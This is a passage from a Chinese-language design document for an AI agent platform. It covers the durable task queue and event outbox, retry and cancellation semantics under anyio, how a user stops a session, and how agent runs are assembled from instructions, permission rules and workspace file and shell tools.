- **保留**（`platform/retention.py`）：启动时与之后每天一次，删掉 7 天前已完成（done）的、处理它的领域声明了可删（`TaskHandler.prunable`）的任务，现在是 `event`、`deliver`，它们完成后没有别的数据引用；failed 一律保留供排查与重试。`run` 不删：`mail.consumed_by` 指向它且 ON DELETE CASCADE，删了会连带删掉它处理过的信件与幂等键；`compaction` 量小，留着。
- **马上执行**（`Worker.run_now`）：发送方提交了一条定向命令或一个事件之后希望它马上生效时，在调用方的任务里经同一个执行边界执行这一条投递（只用于短小的 `event` 投递）；此刻不可领取（lane 被挡住、已被领取）就交给 worker。调用方随时可能被取消（请求断开、调用它的运行被停止），被取消时在屏蔽作用域里把还在 running 的它放回 pending 再照常抛出——投递的写入与完成同一事务，重做是安全的。

### 3.3 事件：以投递任务作为 outbox

**发布一个事件 = 在发布方的本地事务里，为每个订阅者插入一条投递任务**（种类 `event`，payload 是事件类型、事件 id、接收方与数据；`Messaging.publish_in`）。状态变化与「一定会通知到订阅者」在同一个事务里。订阅者在组合根注册（事件类型 → 接收方名、处理器、lane）。处理器返回的 `Commit` 只写**自己领域**的表，与投递完成在同一个事务里提交，所以对自己领域是恰好一次。语义成立的前提：

1. 一个订阅者领域的状态只由它的投递 lane 写（单写者），否则「`execute` 里读、`Commit` 里写」是先查后写的竞态。
2. `Commit` 里不调用别的领域的命令。
3. 消息的数据不合法、接收方没有登记（例如跨版本部署）是存下的数据与代码不一致，投递直接失败（`CorruptState`），不重试。

**lane**：默认每个订阅者一条（`sub:<接收方>`），发给同一订阅者的投递按发布顺序逐条处理，不同订阅者之间并行。需要跨事件类型保序的订阅按对象分 lane，lane 名带订阅者的前缀：

- 通知领域把同一会话的 `RunEnded`、`SessionRead` 与 `SessionDeleted` 放在 `notifications:<会话>`；会话领域的 `Receive` 在 `sessions.receive:<会话>`。

**顺序只对没有失败的投递成立**：最终失败的投递不挡同一条 lane 上之后的投递，人工重试时它排在已经处理过的投递之后。所以依赖顺序的处理器必须检查前置状态：通知的 `RunEnded` 在提交事务里确认会话还在，前置状态缺失时按契约内的情况跳过并记日志。其余处理器都按目标对象的当前状态判断（占用状态），乱序到达也收敛。

队头阻塞：一条投递暂时失败、按退避重试时会挡住同一 lane 的后续投递，所以处理器只执行短命令，不做长任务。可观测：每条投递记事件类型、事件 id、接收方；处理开始、结果、被丢弃的迟到结局都打结构化日志。

### 3.4 定向命令

命令通常同步调用。只有一种情况不够：**发送方先在自己的事务里提交了状态，之后必须保证一条指定的命令一定执行**。这时用 `Messaging.send_in(命令)`：在发送方的事务里插一条指定接收方的投递任务，与事件共用同一个 outbox、同一套重试与失败可见。现有五条：`WorkEnded` 与 `WorkCheckIn`（后台任务记下结局后给会话投信并释放占用；确认仍在运行时投检查信件；同一条按占用者的 lane `sessions.work:<holder>`，检查不会排在结束之后）、`StopThread`（会话的停止事务停下它委派出去的 thread，会话领域给自己的命令）、`Receive`（触发器记下触发后、记下前置检查从正常变为出错后给所属 agent 投告警信，issue 记下动态后投信，第 14、21 节）、`Notify`（前置检查告警投不到 agent 时的兜底、定时触发因上次会话在等待而跳过时提醒；issue 交给用户时发推送）。规则：先改了自己、又必须可靠通知确定的接收方时用定向命令，不用「自己订阅自己的事件」绕路。

**幂等**：处理器的写入与投递完成同一事务，对接收方领域恰好一次。会新建东西的会话命令还带幂等键（`mail.dedupe_key`，同一会话内唯一；委派的 holder 由工具调用 id 确定性派生），重放不重复投信。改状态的命令按目标的当前状态判断，天然幂等。

### 3.5 实时展示总线

`platform.bus.EventBus` 与 SSE 是展示加速，不是领域事件：不持久化、不保证送达。运行的展示事件归会话领域（`sessions.live`），任务状态事件归平台；`api/events.py` 把它们组合成 SSE 的 `ServerEvent`（第 17 节）。命名上区分：领域事件（domain event）与 SSE 推送（server event）。

## 4. 并发模型

结构化并发用 anyio（运行在 asyncio 后端上），ruff banned-api 禁止裸的 asyncio 任务与超时 API（`create_task`、`gather`、`wait`、`wait_for`、`shield`、`timeout`、`TaskGroup` 等，测试除外，唯一的例外见下）。测试用 anyio 的 pytest 插件，任务组可以跨 fixture 的 yield。

**异常的传播边界**：

1. **根任务组**（容器启动时开，关停 = 取消它）：只放「意外异常即进程退出」的循环——worker 调度循环、定时触发循环、流式触发的对账循环、信箱对账循环、运行中检查的循环、任务保留的循环。它们意外退出是 bug，进程退出交给进程管理器重启。
2. **每个任务一个边界**：worker 执行的每个 task 在自己的作用域里执行，边界上捕获异常并按队列规则记账（重试或失败），不向上传播，一个运行出错不影响别的运行。
3. **每个后台任务的监督者一个边界**：意外异常只记 error 日志，由后台任务的对账收敛（「监督意外结束」是契约内的情况）。流式触发的每个托管进程同样：一次启动里的意外异常杀掉进程组、记 error 日志，按一次失败退避重启，检查挡路会话时的意外异常留下事件稍后再试，触发开始后的意外异常丢弃这一批（至多一次），都不穿出去。

**取消**：

- 用户停止 = 不带消息地取消这次运行自己的原生任务（`sessions/stopping.py` 的 `StoppableRuns`，带 noqa 与说明的唯一例外）；关停取消的是外层，宿主收到后同样取消运行的任务再照原语义抛出。原因（实测）：pydantic-ai 把每个工具调用放进原生任务并 await 它，如果用 anyio 作用域停止运行，anyio 的取消消息传进工具任务，工具里的 anyio 任务组（如 shell）把它当成自己的取消吞掉，工具照常返回结果；不带消息的原生取消不会被误认。`tests/test_stopping.py` 固定了三种取消下工具都如实收到取消。
- anyio 的取消是电平触发的：作用域被取消后，里面每一次 await 都会再抛出取消。因此**被取消后还要 await 的清理一律放进屏蔽作用域并加时限**。
- **每个数据库事务**拿到锁之后整个屏蔽 anyio 的取消，取消在事务结束后生效；原生取消只在 `Database.exclusive` 里发出，那时没有事务在进行。不这样做时取消会打断语句，SQLAlchemy 作废连接、后台的关闭等不到结果，关停时卡住（实测）。交换：关停与外层取消要等进行中的事务做完。

**需要屏蔽的清理点**与超时后的收敛：

| 清理 | 超时或失败后 |
|---|---|
| 保存被停止的那一步（`steps.save_stopped`），每个事务都已屏蔽 | 两个事务之间赶上关停时，剩下的由队列恢复后续跑；停止事务照样关闭历史 |
| 后台任务启动失败后的清理 | 记 error 日志；行留在 running，检查的对账记为被中断 |
| 结束进程组并回收（后台任务、同步 shell、前置检查、流式触发的常驻命令） | 记 error 日志；后台任务由对账或启动时记为被中断 |
| `run_now` 被取消后把任务放回 pending | 记日志；任务留在 running 直到重启时 recover |

## 5. 核心数据流：一切都是 Task

我们在 pydantic-ai 消息上加的约定（工具结果 metadata 的键、停止标记、合成的工具结果、「调用是否已有结果」的定义）按谁写下分两处登记：会话领域的（停止、事件信件、运行上下文、子会话、「调用是否已有结果」）在 `muliao.sessions.conventions`，运行时写下的（工具交回给用户的文件与图片）在 `muliao.agent_runtime.conventions`；解析也只在登记处写一份，新增约定先在那里登记。

所有触发源只做一件事：**创建 session（或选中已有 session），往它的信箱投一封信件**（`inbound.receive` → `mailbox.post_in`）。消费信箱的运行是一条 `run` task，之后的执行、重试、通知全部由同一个任务队列驱动，没有例外：`ask_agent` 也只是往私有 thread 的信箱投信，发问方停在这次调用上等回信（第 7 节「挂起的调用」）。

```
Web / 触发器（Receive 命令）/ delegate_task / ask_agent     后台任务与委派的结局、运行中检查
          │  inbound.receive(Inbound)                               │  deliver_in / post_check_in
          ▼                                                               ▼
       mail（会话信箱，mailbox.post_in）──── wake_in：需要时投递一次运行
          │
 tasks(run) ──► Worker ──► RunHandler ──► Consumer ──► AgentRuntime.run_steps（pydantic-ai 逐步驱动）
                                              │ 每一步一个事务：
                                              ├─ 请求模型之前：这次请求 + 它带上的信件（记为已处理）；上下文超过阈值就先压缩
                                              └─ 模型回复之后：这条回复
                                              │ 运行结束（与 task 记为完成同一事务，sessions.finish，只写会话自己的数据）：
                                              ├─ session.updated_at
                                              ├─ 工作做完就结清委派来的关联，同一事务把结局交回发起方（sessions.delegation）
                                              ├─ 发布 RunEnded（通知领域推送、issue 请表态）
                                              └─ 信箱里还有信件 → 下一次运行
```

- **删除约束**：会话或 agent 忙时拒绝删除（409），避免运行结果无处提交、工具写到被删的目录。**忙** = 会话（连同归它所有的私有 thread）的 lane 上有排队或运行中的任务（运行、压缩），或有 active 占用（后台任务、委派出去的工作）。界面上「停止」与「删除」是两步。
- **实时展示**：运行中的事件经进程内 EventBus 推到前端 SSE（形状见第 17 节「前后端契约」）：工具调用与结果是与历史同一个投影的会话条目（`transcript.call_item` / `result_item`，文字截断过），回答与思考是追加到同类最后一条的文字增量；运行时经 `StepHooks` 报告流式的文字、工具调用（参数已脱敏）与结果，会话领域投影并发布。数据库是唯一事实源，事件流只是展示加速。每一步保存后历史里就有了这一步，所以内存里只留当前这一段的事件（`sessions.live.LiveSegments`：一段从一次请求保存之后开始，包括模型的回复与它调用的工具，带这一段的 `segment_id`（`LiveSegment`）与递增的 `seq`），会话接口作为 `live` 给出，中途打开页面从这一段的开头看起；回复在执行工具之前就已保存，会话接口不在历史里重复显示这一段已经在展示的消息（`after_message_id`）。每保存一次请求就换一段并发 `saved` 事件，前端重新拉取历史；前端把快照与之后经 SSE 收到的事件按 `segment_id` 与 seq 合并，丢掉别的段，发现缺口（快照先于订阅生成）就再拉取一次。运行结束（完成、失败、停止）时丢弃缓存。
- **步骤的时间**：工具调用条目的 `at` 是开始执行的时间，结果（或被退回的错误）条目的 `at` 是结束的时间，会话页据此显示运行中步骤的已运行时长（刷新页面也从真实开始时间接着算）、已完成步骤与过程组的开始时间和耗时（`web/src/stepTime.ts`）。开始时间：回复在执行工具之前保存，所以历史里取回复那一行的 `messages.created_at`（`to_items` 的 `saved_at`，只有会话接口给），运行中取收到调用事件的时间（`sessions.steps`；同一批调用先一起发出调用事件再并行执行），两者只差几毫秒。10-20 之前一整轮在结束时才一次提交，回复那一行的保存时间晚于它的工具结果：结果早于开始的调用不给开始时间（`transcript.checked_times`）。结束时间取结果上 pydantic-ai 打的 `timestamp`；停止、中断时事后补上的结果（`sessions.conventions.made_up_result`）产生的时间不是调用结束的时间，不给。挂起调用（如 ask_agent）的耗时包括等待对方的时间，被中断后重放的还包括停机时间——都是调用真实经过的时间。思考没有可靠的起止时间，不显示。拿不到的为 None，前端不显示、不推算。只有正在进行的运行里（会话接口的 `live` 与之后的 SSE 条目）没有结果的调用才计时；历史里没有结果的调用（执行时失败、等重试或续跑）并没有在执行，只显示开始时间。

### 用最终正确性换架构简化

换掉的：「每个触发点、每次模型调用、每次推送都必须当场成功」，以及领域之间的强一致（一次运行结束时把记完成、结清委派、给发起方投信、推送放进一个跨领域的大事务）。

换来的：所有触发源、通知、领域之间的反应共用一套「持久化 task + 重试 + 启动恢复」语义，没有各自的补偿逻辑；每个领域只在自己的事务里改自己的表。

三条判据：

1. **失败可见**：task 失败记录 `error`、打 error 日志，UI 的「任务」页可查并可手动重试；session 页显示最近一次运行失败；重试运行期间保留上一次的错误。
2. **可收敛**：契约内的失败（模型接口 408/409/425/429/5xx/529、底层为连接错误的 `ModelAPIError`、Anthropic 流以 200 开始后中途收到契约外类型的 error 事件（如中转站上游空闲超时 `stream_timeout`；契约内类型已由 pydantic-ai 换成对应状态码）、OpenAI 在 200 的响应体或流里报的契约内暂时性错误码（`server_error`、`rate_limit_exceeded`；Responses 的 error/response.failed 事件与兼容网关的顶层 error 对象两种形状）、网络错误、超时、推送服务 5xx/429、推送请求发出前的本机 `OSError`（如部署原地替换安装目录时 certifi 的 CA bundle 暂缺））按指数退避重试，上限见第 4 节（外部服务不可用与其余暂时性失败分别设上限）。worker 只认 `TransientError` 与 `TimeoutError`，不认识任何 SDK：模型与网络层的暂时性失败由 agent_runtime 在一次模型运行的边界上换成 `ModelUnavailable`（`ServiceUnavailable` 的子类，`agent_runtime/transient.py`），推送抛 `ServiceUnavailable`（同样按长窗口重试，只重推失败的那台设备），web 工具、MCP 等适配层各自抛 `TransientError`（连不上、读超时也要自己换，否则冒到运行边界会被当作模型不可用）；进程崩溃后启动时把 `running` 复位为 `pending` 重新执行（恢复次数同样受上限约束，见第 4 节）。运行**每一步保存**（这次请求与它带上的信件同一个事务、回复一个事务），收尾与 task 记为完成同一个事务，所以重试从上一步续跑：历史停在一条没得到回复的请求上就重发它，停在带工具调用的回复上就给那些没出结果的调用补上「被中断、没有重新执行」的结果再重发（见第 7 节「从哪里开始」），已经保存的步骤不会重放，也不会产生重复消息。领域之间的反应经事件投递，处理器的写入与投递完成同一事务（第 3.3 节）。
3. **代价可控**：中断那一步里正在执行的工具不重放（它的副作用是否已经发生无从知道，模型拿到「被中断」的结果自己判断），所以重复的副作用只来自一步之内的并行调用——同一次模型回复里的其他工具已经做完、结果还没保存时整步一起补结果，模型可能重做它们；`web` 工具按次计费，重做的搜索与抓取会再付一次费（抓取按目标域名限流时也可能再次撞上限流）。运行都不设请求数上限（显式传 `UsageLimits(request_limit=None)`，盖掉 pydantic-ai 默认的 50）：开发类任务一轮上百步是常态，也不设总时长（见 TaskHandler 接口）：跑多久由 agent 自己判断，会话轮次靠用户停止收束。Web Push 每个订阅（设备）一个 deliver task，只有 404/410（RFC 8030 的订阅失效）才删除订阅，其他 4xx 视为本端问题让该 task 失败、不删数据；暂时性失败只重试失败的那一台（各设备的 lane 互不阻塞），不会再推给已送达的设备；只有推送成功后、task 记为完成前进程崩溃，才会对这一台重推一次。领域之间的反应晚几百毫秒（推送、委派的结局、删除后的清理）。

契约外的失败（代码 bug、模型返回 400、请求超限、响应解码失败、配置错误、存下的消息与代码不一致）不重试，task 直接 `failed` 并告警。

后台循环（worker、定时触发）意外退出视为 bug，进程直接退出交给进程管理器重启。单个定时触发器的数据不合法时只停用它并记录 `disabled_reason`，不影响其他触发器。

### 停止会话

用户可以停止会话（`POST /api/sessions/{id}/stop`，界面在会话的工作状态不是 idle 时显示停止按钮：会话详情 `SessionDetail.state` 与列表同一条规则，所以排队中的运行、在等后台任务或委派的会话也停得了；只剩挂起的提问时按钮也在，停止不清掉提问，提问仍可回答。停止本身不产生前端收得到的事件，界面在请求返回后自己重新拉取）。停止是同步的（#272）：`SessionStopper` 返回时停止事务已经提交——运行中被停止时 `StoppableRuns.stop` 等运行连同停止后的收尾（`run` 的 `stopped`：保存与 `SessionHalt`）做完才返回，取消没赶上（运行刚好正常结束）时由停止者自己执行停止事务；所以调用方马上投的信（`issue_stop` 的收尾消息）不会被还没执行的停止事务清掉。停在读出状态之前的运行收尾时也 `wake_in`，停止之后、它记为完成之前到的信照常唤醒下一次运行。停止就是消费停止、信箱清空，连带停下它发起的异步工作。做法同 ChatGPT、Claude Code：停止前已经产生的部分照常保存，因为工具的副作用（shell、写文件）已经发生，之后的模型必须知道做过什么，否则会重复执行。

- **只取消模型运行**：`StoppableRuns` 把运行放在单独的子任务里，停止只取消它；worker 的任务没有被取消，所以与关停（它取消外层任务，已保存的步骤留着、由队列恢复或重试续跑）区分开（第 4 节）。
- **补齐已产生的部分**（`steps.save_stopped`）：每一步本来就保存了，运行中被停止时只需保存当前这一步还没保存的部分：消费者从 pydantic-ai 运行中的历史（`ctx.state.message_history`，逐步驱动时直接拿到）取出它们，还没出结果的工具调用补上「被用户停止、可能已部分执行」的结果（用 `sessions.conventions.unanswered_calls` 判断），最后一条标上 `RUN_STOPPED`，展示为「已停止」。正在生成的那段回答由 pydantic-ai 以 `state='interrupted'` 留在运行历史里，一起保存（之后也会发给模型）；其中参数还没生成完的工具调用同样补上结果，参数在落库前脱敏，截断到无法解析的 `vault_set` 参数整体替换。压缩进行中被停止时，触发压缩的那次请求已经保存，不重复补结果。未核实：被打断的思考块（没有签名）发给 Anthropic 等提供方会不会被拒，遇到时那次运行失败可见。
- **停止事务**（`sessions/halt.py` 的 `SessionHalt`，运行中被停止时在运行退出之后执行，没在运行时直接执行；一个事务，只写会话自己的数据）：
  - 让库里的历史停在不会被续跑的地方：悬空的工具调用补上「被停止」的结果（等用户回答的提问除外，用户仍可回答），末尾没得到回复的请求标上 `RUN_STOPPED`。运行中被停止时上一步已经做了；停在运行拿到运行中的历史之前（组装指令、连接 MCP 期间）、或停在等重试的运行上时，靠这一步。
  - 排队与等重试的运行记为完成，不再执行。
  - 全部 active 占用记为 cleared：之后才到的结局（后台任务结束、thread 的结清）一律不投——否则刚清空的信箱又会唤醒它。因为停止事务在运行完全退出之后，运行退出途中登记的占用也会被清掉。
  - 交给这个会话、还没结清的关联结清为「被停止」，结局交回发起方；清空信箱：还没交给模型的信件记为被丢弃（不删除，界面上划掉显示，之后再有信件交给模型就不再显示）；之后新到的信件照常唤醒消费者。
  - 被清掉的委派：给做这些工作的 thread（`delegation.threads_of_holds_in`，读委派记录 `delegations` 上的 thread）各发一条 `StopThread`（逐层停止，第 8 节）；发布 `SessionStopped`（带被清掉的占用），工作区领域结束对应的进程（第 9 节）。
- **运行开始与停止的竞态**：运行任务已被领取、但还没登记可停止的运行时，停止看不到正在进行的运行，直接执行停止事务（领取了的运行不在「排队与等重试」之列，照常执行）。停止事务已让历史停在标着停止的地方、清空了信箱，于是这次运行开头没有要交给模型的，按「没有要交给模型的」收尾：只看要不要唤醒下一次，不按保存的历史收尾、不推送、不结清（结局由停止做过）。最终失败的运行在会话被停止之后被手动重试，走的是同一条路；例外是它已经保存了最终回复、只在收尾时失败的情况，这时停止没有可以标记的东西，重试会按保存的历史收尾。
- **私有 thread** 与其他会话一样可以停止（用户在它的页面上，或发问方用 `stop_thread`，或 `ask_agent` 的 timeout 到期），发问方那次 `ask_agent` 调用拿到「被停止」（超时时是「超时被停」）的结局。
- 被停止的运行照常收尾（task 为 done），不推送。

## 6. Agent 运行时

一次运行的组装（`sessions/consumer.py` 驱动，`agent_runtime/runner.py` 组装上下文与工具）：

- **原则：给模型看的是名称和描述，给程序用的是 id。** 工具参数、返回值、instructions 里只出现 agent 名称；名称唯一，由工具层（`AgentService.find_by_name`）解析为 id，写错时把可用名称列表作为错误交还模型。id 只会作为文件路径的一部分（`agents/<id>/…`）出现在工作目录里。`tests/test_flow.py::test_model_sees_agent_names_never_ids` 守住这条规则。
- **instructions** = 全局记忆 + 运行上下文（agent 名、工作目录、session 来源的说明——由会话领域给出（`sessions.origins.OriginNotes`：用户、委派的说明在会话领域，触发器、issue 的说明含它们的规则，由各自 api 导出 `SESSION_NOTE`、组合根合成），运行时不认识来源）+ agent 自己的记忆全文 + skill 索引（名称、描述、是否自己的）+ 自我进化守则。**只放同一个会话的不同运行之间不会变的内容**：instructions 渲染成提供方的 system，缓存断点就放在它末尾（下面「prompt caching」），里面只要有一个每次运行都不同的值，整段历史每次运行都要重新写入缓存，同一个 agent 的不同会话、压缩也只能复用工具定义那一段。
- **运行上下文**（`instructions.build_run_context`）= 必须随运行变化、因而不能进 instructions 的那几行：当前时间，「回答交给谁」（`Audience`，由这次运行处理的信件推导，同一个会话的不同运行会不同），以及工具在这次运行连接时发现、要告诉模型的问题（`RunScope.notices`，如不可用的 MCP server，`instructions.with_notices` 一条一行接在后面；它们在进入 pydantic-ai 的 iter、工具连接之后才齐，所以由 `StepHooks.started` 交给 `sessions.steps`，每次驱动覆盖一次）。会话来源（`Origin`）是会话创建时定下的，留在 instructions 里。它作为单独一段用户消息挂在**这次运行新增的第一条请求**上（`sessions.conventions.attach_run_context`，`sessions.steps` 在信件并入之后挂），随消息入库、之后原样重放——旧消息字节不变，缓存才命中；会话条目里不展示它（`transcript.to_items` 按 `RUN_CONTEXT` 跳过），它不是用户说的话。从历史续跑、重发末尾那条已保存请求的那一步不挂（改已保存的消息就等于作废它之前的缓存），这段留给这次运行的下一条新请求。运行中途压缩把挂着它的那条请求压进了摘要时（长运行会切过自己的开头），下一条新请求重新挂一段（`RunState.run_context_row` 记下挂在哪条消息上）。
- **toolsets**（每个领域一个模块，各领域的 `tools.py`）。对话里开放哪些内置工具、能用哪些条目由 agent 的**分发规则**决定（`agents/permissions.py`，#172 → #180 → #235）。目的是防误操作、减少无关工具与条目占上下文，不是安全隔离。内置工具是 kind=tool 的条目（内容在代码里、归平台、不可改），在 `permissions.TOOLS` 唯一登记读 / 写与是否管理类（`admin`）；每类条目只有一套写工具，没有 `*_public` 变体（#235 删掉了公共 skill / secret / MCP 的写工具与 `mcp_set_enabled`，MCP 启停只在界面上）。组合根启动时核对注册的工具与这张表一一对应（`container._check_permissions`；web 工具只在配置了 `[web]` 时注册），不一致即报错。**规则**是 `kind:glob`（kind 为 `tool`、`skill`、`mcp`、`secret` 字面量，名字部分 fnmatch，如 `tool:issue_*`、`skill:relay-host`、`secret:RELAY_*`），allow / deny 两组，deny 优先。**内置角色只有两个**，规则 = 代码里固定的部分（`permissions.FIXED_RULES`）∪ 存在 `roles` 表里可编辑的部分：`base` 每个 agent 隐含（不写进 agent 的 roles，写了报错），固定部分是全部非管理工具（写成纯 allow，从 `TOOLS` 得出：新加的工具自动归入；不用 deny，否则 `admin` 或自己的 allow 都放不开），可编辑部分收录人人可用的条目（原来的「公共」skill、secret；curator 上提 = 往 base 加 `skill:<名>`）；`admin` 固定为 `tool:*`，并且能改任何条目（规则 2）。管理类工具：`create_agent` / `update_agent` / `delete_agent`、`create_role` / `update_role` / `delete_role`、`transfer_item`、`memory_edit_public`。用户可自建角色（`agents/distribution.py` 的 `Distribution`，事务内的查询与校验在 `agents/roles.py`；被 agent 引用时不能删；内置的不能删，可编辑部分可以改；每次增删改记一版）；服务器、交易账户这类多对多关系就是一个角色收录 skill + secret 再分给几个 agent。agent 的配置 = `roles` + 自己的 `allow` / `deny`（表 `agent_rules`，每个 agent 一行）；最终规则 = base + 各角色 + 自己的，allow 与 deny 各取并集（`Distribution.rules`，角色按现在的定义展开，改角色从下一次运行生效）。写入时校验：角色存在（同一写事务里查，删角色也在事务里查引用）、规则形式合法、tool 规则至少匹配一个登记的工具、**新加的** skill / mcp / secret 规则至少匹配一个现有条目（`roles.check_rules_in`；已有的不查：条目删掉再建分发不丢，也不让改别的字段失败）；启动检查（`Distribution.verify_stored`）对已存的 agent 与角色再查形式与 tool 规则。条目怎么按规则用、谁能改见第 13 节「归属与分发」。运行开始时由 `agent_runtime.toolbox.Toolbox` 按规则算出内置工具列表（按工具名过滤）并加上 MCP（它能用的、已启用的 server）；调用时不再判断。最终工具只在当前配置注册的工具里取（`permissions.available_tools`，没配置 `[web]` 时不列 web），组合根启动时核对它与实际注册的一致，所以界面、`get_agent`（`Distribution.reach`）与运行时得到同一份。界面与 `get_agent` 列出 agent 最终能用的工具（每个标读 / 写与管理类）与条目，与运行时同一套计算：`get_agent` 用 `Distribution.reach`（工具与条目一个事务里算完），界面用 `POST /api/agent-preview`（`Distribution.preview_agent`，还没保存的配置也行，含它自己的条目，已存规则作「之前的」校验）。向用户提问（`ask_user`，见第 7 节）总是列出（工具列表在 prompt 缓存前缀的最前面，随运行增减会让整个前缀失效），但只在用户等着这次运行的回答（`Audience.USER`）时可用，否则调用被拒绝、交还模型。运行的工具组合（`RunProfile`）按规则算出，工具里不做「这是哪种运行」的运行时检查。**工具列表只由 agent 的规则配置决定，不随单次运行的状态变化**（工具定义在 prompt 缓存前缀的最前面，列表一变整个前缀失效）：不用 `prepare` 按运行状态隐藏工具；依赖运行状态的前提（例如 `ask_user` 要有用户在等）在调用时检查，不满足就抛领域错误、交还模型。各组工具：
  - 局部修改（`update_agent`、`trigger_update`）由领域服务在一个事务里读取并只改给出的字段，工具层不读后整体写回：同一响应里并行的多个修改、以及用户在界面上的同时修改互不覆盖。面向模型的错误信息只带名称，不带 id。
  - 工具的输入输出用模型熟悉的标准格式，并在工具说明里写明是哪种（#249）：带行号的文件内容一律 `cat -n`（行号右对齐 6 列 + 制表符，`workspace.file_edit.numbered`），行号与 read_file 的 `offset` 都从 1 起；多段读取的标题沿用 `head` 的 `==> path … <==`；截断与续读提示是单独一行的方括号说明（`[output limit reached at line X of N; continue with offset=X+1]`、`[N more lines; …]`、`…[truncated: N more chars]`）；结构化结果（pydantic 模型、列表）由 `agent_runtime.tool_results.JsonResults`（Toolbox 套在每个内置工具集外，MCP 不套）序列化成**一段** JSON 文本——pydantic-ai 把列表结果逐元素交给 provider，Anthropic 下每个元素一个 text block，模型看到的是几个对象首尾相接、不是合法 JSON——说明里写明是 JSON 数组还是对象并列出全部字段（tests/test_tool_schemas 核对）；写操作的确认是「动词过去式 + 对象 + 名字」（`created issue #N`、`updated trigger x (paused); status: {…}`）；run_shell 是 `exit_code: N` 加原始输出。参数名不向 Claude Code 的 `file_path`/`old_string` 靠拢：审计里没有因参数名写错被拒的调用，且 `memory_edit`/`edit_skill` 同用 `old_text`/`new_text`。
  - `workspace`：`read_file`（`cat -n` 格式，`offset` 是 1 起的行号；单行超过 2000 字符截断；`reads` 一次读多个文件或同一文件的多段，每段一个 `==> path lines A-B of N <==` 标题，读不了的段就地写出错误、其余照常返回——审计里 agent 用 `sed -n` 一条命令读好几段，输出没有行号；总输出到 `runtime.tool_output_max_chars` 时在整行处停下，写明读到第几行、用哪个 offset（及 limit）接着读，多段时后面没读的段逐个列出，不再统一截成 `…[truncated N chars]`（#181：截断点不在行边界、看不出断在哪个文件哪一行）；`path` 是能内联的图片（按扩展名：png/jpeg/gif/webp）时交回一句说明加图片内容，经 `ToolImagesToFiles` 存成文件引用、发请求时展开给模型看，与 MCP 截图同一条通道（见第 7 节「附件与文件」）；文件超过 3.75MB（Anthropic 单张图片 5MB 按 base64 编码后计）直接拒绝并提示先缩小，不在工具里缩放（放进历史后每次请求都会被拒）；类型判定与 `share_file` 共用 `_media_type`；图片不接受 `offset`/`limit`，也不能放在 `reads` 里）/ `write_file`（回报新建还是覆盖、行数）/ `edit_file`（每处修改恰好用一种方式定位，再替换成 `new_text`：`old_text` 原文，`replace_all` 替换全部，失败时说明多处在哪几行、或最接近的是哪几行只差空白；`start_line`/`end_line`/`anchor` 行号区间整行替换，`anchor` 是首行原文（两端空白不计），对不上就报错并展示那几行现在的内容，防止行号过期改错地方；`pattern` 是 ast-grep 模式（依赖 `ast-grep-py`，语言按扩展名，表在 `workspace.syntax_edit.LANGUAGES`，不认识的扩展名直接拒绝），必须恰好匹配一处（`replace_all` 时每一处、不许嵌套），`new_text` 可引用模式里的元变量，只替换匹配到的代码、行首缩进保留，`new_text` 第 2 行起补上匹配处的缩进，代入的多行捕获按元变量在 `new_text` 里所在行的缩进整块重排（同 ast-grep rewrite：`replace_all` 改不同缩进层级的多处、把 `$$$BODY` 包进一层 with 才不会坏；ast-grep-py 的 `replace` 不代入元变量，所以自己实现），匹配在行尾时去掉 `new_text` 末尾的一个换行，`new_text` 为空即删除：连同装饰器包装/`export` 一起删，占满整行时删掉这些行并把两侧空行合并成原有较多的一份——#180 删整块测试函数时逐字贴几十行原文易错、改用脚本切块又失败过三次，才加了后两种。三种都是 `workspace.file_edit.Edit` 的实现（`file_edit.Replace`、`file_edit.LineRange`、`syntax_edit.PatternEdit`），只报出要做的各处替换（`Splice`：字符区间 + 新文本），由 `apply_each` 拼出新文本；`edits` 一次改多处，可跨多个文件（每项字段与单处参数同一组，另可带自己的 `path`，不带就用顶层 `path`，tests/test_tool_schemas 核对；#205：审计里约 49 次多文件改动是每次现写 python 替换函数做的），依次作用（同一文件里 `old_text`/`pattern` 在前面改过的文本里找，行号与 `anchor` 一律指调用前的原文、不论先后（#218：原先按中间状态算，要模型自下而上列或心算偏移），由 `workspace.file_edit.Origin` 按每处修改报出的替换（不比对整份文本，重复的空行、`}` 不会对错位置）记下原文各行现在的位置来换算，行号区间碰到前面修改改过、删掉或插进新行的地方就拒绝；同一文件写成不同路径按真实路径认成一份），任何一处失败就所有文件都不写盘，报错指出第几处，规则在 `workspace.file_edit.apply_each`（按键区分多份文本）；成功时逐个文件回显改后文件里改动处的行（前后各 2 行上下文，与 read_file 同为 `cat -n` 格式，不连续的块之间用 `--` 分隔，按改前改后比对得出：`workspace.file_edit.changed_ranges`），省掉回读确认）/ `share_file`（把文件发给用户，见第 7 节「附件与文件」）——这四个文件工具都标 `sequential=True`（pydantic-ai 的屏障：同一次回复里排在前面的调用先做完、它单独执行、排在后面的再开始），因为模型常在一次回复里先 `run_shell` 生成文件、再读或发送它，并行时文件还没生成就报 file not found（#224）；它们都是瞬时本地操作，串行几乎没有代价；文件工具把同一回复里的调用切成前后两段，段内 `run_shell`、委派等其余工具之间照旧并行 / `run_shell`（cwd = 工作目录，最小环境变量，可按 key 注入 secret，输出中的 secret 明文被替换为 `[secret:KEY]`；`background: true` 时作为后台任务运行，见第 9 节）/ `job_status` / `job_kill`。都在工作区领域：`workspace.tools.workspace_toolset` 在 `workspace.file_tools` 的文件工具之上加 `run_shell`（前台与后台）与后台任务工具，edit_file 的编辑规则在 `workspace.file_edit` / `workspace.syntax_edit`。不做强隔离——按需求为单人本机使用。不自己实现搜索工具：搜索靠 shell 里的 ripgrep（`rg`，本机需安装），run_shell 的说明里写明用法；说明里还写明输出上限（`runtime.tool_output_max_chars`，与 web_fetch 共用），提醒模型自己用 `head`/`tail`/`rg -m`/`cut -c` 控制输出长度。
